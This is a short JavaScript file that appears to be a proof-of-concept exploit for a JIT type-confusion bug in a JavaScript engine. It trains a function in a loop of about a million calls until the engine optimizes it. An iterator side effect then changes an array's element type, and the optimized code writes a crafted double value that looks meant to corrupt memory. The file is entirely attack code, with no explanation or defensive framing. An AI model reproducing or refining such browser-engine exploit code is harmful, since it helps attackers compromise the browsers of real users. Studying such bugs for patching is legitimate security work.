try {
   var ary_1 = [1.1,2.2,3.3]
   var ary_2 = [1.1,2.2,3.3]
   var ary_3 = [1.1,2.2,3.3]
   ary_3['www'] = 1
   var f64_1 = new Float64Array(0x10)
   f64_1['0x7a'] = 0xffffffff

   var flag = 0;
   var p = {"a":{}};
   p[Symbol.iterator] = function* () {
       if (flag == 1) {
           ary_2[0] = {}
       }
       yield 1;
       yield 2;
   };
   var go = function(a,b,c){
       a[0] = 1.1;
       a[1] = 2.2;
       [...c];
       b[0] = a[0];
       a[2] = 2.3023e-320
   }

   for (var i = 0; i < 0x100000; i++) {
       go(ary_1, f64_1, p)
   }

   flag = 1;

   go(ary_2, f64_1, p);
} catch(e) { }
